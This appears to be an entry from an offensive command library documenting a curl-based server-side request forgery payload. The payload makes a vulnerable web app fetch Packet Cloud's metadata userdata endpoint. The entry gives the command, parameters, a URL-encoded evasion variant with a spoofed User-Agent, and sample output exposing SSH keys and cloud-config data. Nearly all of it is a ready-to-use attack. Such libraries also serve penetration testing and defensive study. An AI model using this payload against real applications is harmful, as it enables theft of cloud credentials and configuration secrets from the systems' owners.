---
id: a0769209-fd4b-488f-b8e1-0890af854776
name: curl-ssrf-packet-metadata
type: command
executor: bash
data: 'curl "$_VULN_ENDPOINT?url=https://metadata.packet.net/userdata" -v'
output: null
created_at: '2023-04-06T03:56:38.514610+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - cloud
verified: true
validated: true
---

# curl-ssrf-packet-metadata

## Command

```bash
curl "$_VULN_ENDPOINT?url=https://metadata.packet.net/userdata" -v
```

## Description

This command exploits an SSRF vulnerability by sending a crafted HTTP request to a vulnerable web application's endpoint, forcing it to fetch the Packet Cloud metadata service. It is used in the context of testing or exploiting SSRF to access internal cloud resources, retrieving sensitive userdata in JSON format.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_ENDPOINT | The full URL of the vulnerable application's endpoint (e.g., http://target.com/api/fetch) | Yes |
| -v | Verbose mode to display request/response details, including headers and errors | No |

## Examples

### Basic Usage

```bash
curl "http://vulnerable-app.com/api/fetch?url=https://metadata.packet.net/userdata" -v
```

### Advanced Usage (with URL encoding for evasion)

```bash
curl "http://vulnerable-app.com/api/fetch?url=https%3A//metadata.packet.net/userdata" -v -H "User-Agent: Mozilla/5.0"
```

## Expected Output

On success, the command returns the HTTP response from the vulnerable app, which includes the fetched metadata JSON in the body:

* Connected to vulnerable-app.com (203.0.113.50) port 80
> GET /api/fetch?url=https://metadata.packet.net/userdata HTTP/1.1
< HTTP/1.1 200 OK
< Content-Type: application/json

{
  "hostname": "packet-instance-123",
  "ssh_keys": ["ssh-rsa AAAAB3NzaC1yc2E..."],
  "userdata": "cloud-config script..."
}

Failure might show 403 Forbidden or empty body if blocked.

## Related

- [[procedures/Exploit-SSRF-to-Retrieve-Packet-Cloud-Userdata]]
